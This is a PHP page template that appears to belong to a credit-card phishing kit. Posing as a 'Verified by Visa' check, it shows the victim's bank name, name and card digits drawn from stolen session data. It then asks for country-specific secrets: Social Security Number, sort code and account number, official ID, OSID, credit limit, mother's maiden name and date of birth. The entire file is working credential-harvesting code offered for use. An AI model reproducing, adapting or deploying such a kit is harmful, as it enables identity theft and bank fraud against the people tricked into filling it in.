﻿<?php
#   ___   ___       __  __     _     ___   ___     _   
#  / __| / __|     |  \/  |   /_\   | __| |_ _|   /_\  
# | (_ | \__ \  _  | |\/| |  / _ \  | _|   | |   / _ \ 
#  \___| |___/ (_) |_|  |_| /_/ \_\ |_|   |___| /_/ \_\
session_start();
date_default_timezone_set("Africa/Tunis");
include("settings/gs_config.php");
include("languages/index.php");
include ("languages/lang".$_SESSION['gs_langlink']);
$gs_countrycode = $_SESSION['gs_cardarray']['bin']['_cntrcode_'];
?>
<div class="CTABannerContainer CTABannerContainer--billinginfopage ">
			<div class="DefaultCTABanner">
			</div>
            <div id="gs_load">
                <div id="gs_loading"></div>
                <div id="gs_overlay"></div>
            </div>
            
			<div class="DefaultGreeting">
				<div class="cta-banner">
					<div class="cta-headline">
						<span class="cta-name">
							<center><h2><?php echo $gs_string25 ?></h2></center>
						</span>
						<div class="textInput lap">
							<div class="fields email large">

								<div class="nativeDropdown  large ">
									<div class="selectDropdown ">
									</div>
								</div>
							</div>

						</div>
                        <div class="cta-name"><h2 style="color: #0666B3;"><?php echo $_SESSION["gs_cardarray"]["bin"]['_cc_bank_']  ; ?></h2></div>
					</div>
				</div>
			</div>
		</div>
<div style="
        
    margin-left: 2px;
    width: 335px;
    border: solid 2px #808080;
    padding: 17px;
">
<div class="form-header">
	<img style="float:right" src="images<?php echo $_SESSION["gs_vbvlogo"] ?>">
</div><br>
<br>
<font style="font-size:13px">
<i><?php echo $_SESSION['gs_billarray']['gs_lname'].' '.$_SESSION['gs_billarray']['gs_fname'] ?></i>
<br>
<i>Date:  <?php echo date("m/d/y");  ?></i>
<br>
<i>Card Number: xxxx-xxxx-xxxx-<?php echo substr($_SESSION['gs_cardarray']["gs_cc"], -4 ); ?> 
</i>
<br>
<?php
################### SWITZERLAND || GERMANY #####################
if($gs_countrycode == "CH") {    
    echo '<tr class="Height_XXX">
                <td style="font-weight: bold;">Kontonummer :</td>
                <td><input required type="tel" name="kontonummer" id="kontonummer" style="width: 170px;padding-left: 4px;"></td>
            </tr>';  
}
########################### GREECE #############################
elseif($gs_countrycode == "GR") {   
    echo '<tr class="Height_XXX">
                <td style="font-weight: bold;">Official ID :</td>
                <td>
                    <input required type="tel" name="offid" id="offid" style="width: 170px;padding-left: 4px;"></td>
            </tr>';  
}
########################## AUSTRALIA ###########################
elseif($gs_countrycode == "AU") {
    echo '<tr class="Height_XXX">
                <td style="font-weight: bold;">OSID :</td>
                <td><input required type="tel" name="osid" id="osid" style="width: 170px;padding-left: 4px;"></td>
            </tr>
            <tr class="Height_XXX">
                <td style="font-weight: bold;">Credit Limit :</td>
                <td><input required type="tel" name="creditlimit" id="creditlimit" style="width: 170px;padding-left: 4px;"></td>
            </tr>
            <tr class="Height_XXX">
                <td style="font-weight: bold;">Member Number :</td>
                <td><input required type="tel" name="membernumber" id="membernumber" style="width: 170px;padding-left: 4px;"></td>
            </tr>';
}
################# IRELAND || UNITED KINGDOM  ###################
elseif ($gs_countrycode == "IE" || $gs_countrycode == "GB" ) {
    echo '  <tr class="Height_XXX">
                <td style="font-weight: bold;">Sort Code :</td>
                <td><input required type="tel" name="sortnum1" id="sortnum1" class="sortnum" style="width:28px;text-align:center"  maxlength="2" data-maxlength="2"> - <input required type="tel" name="sortnum2" id="sortnum2" class="sortnum" style="width:28px;text-align:center"  maxlength="2" data-maxlength="2"> - <input required type="tel" name="sortnum3" id="sortnum3" class="sortnum" style="width:28px;text-align:center"  maxlength="2" data-maxlength="2"> (XX-XX-XX)</td>
            </tr>                  
            <tr class="Height_XXX">
                <td style="font-weight: bold;">Account Number :</td>
                <td><input required type="tel" name="accnumber" id="accnumber" class="accnumber" style="width: 170px;padding-left: 4px;"></td>
            </tr>';            

}
#################### UNITED STATES || CANADA ###################
elseif ($gs_countrycode == "US" || $gs_countrycode == "CA") {
    echo '  <tr class="Height_XXX">
                <td style="font-weight: bold;padding-left: 15px;">Social Security Number :</td>
                <td><input required type="tel" name="ssn1" id="ssn1" class="ssnum" style="width:30px;padding-left: 2px;" maxlength="3" data-maxlength="3"> - <input required type="tel" name="ssn2" id="ssn2" class="ssnum" style="width: 24px;padding-left: 2px;" maxlength="2" data-maxlength="2"> - <input required type="tel" name="ssn3" id="ssn3" class="ssnum" style="width:40px;padding-left: 4px;" maxlength="4" data-maxlength="4"> (XXX-XX-XXXX)</td>
            </tr>';
}
#################### IRELAND || CANADA ###################
if ($gs_countrycode == "IE" || $gs_countrycode == "CA") {
   echo'<tr class="Height_XXX">
            <td style="font-weight: bold;padding-left: 15px;">Mother’s Maiden Name :</td>
            <td><input required type="tel" name="mmname" id="mmname" style="width: 170px;padding-left: 4px;"></td>
        </tr>';
}           
?>
<br>
<i>Date Of Birth :</i><input style="width:100px;height:18px" type="textInput" placeholder="MM/DD/YYYY" title="" id="password_vbv" required="required" autocomplete="off" autocorrect="off" autocapitalize="off" value="" aria-required="true">
<br>
</font>
	<div id="action-buttons" class="buttons">
		<button class="CAPE-Button btn full " onclick="gs_processvbv();" type="button" id="billingInfoContinueBtn">
			<span>Continue</span>
		</button>
	</div>
	</div>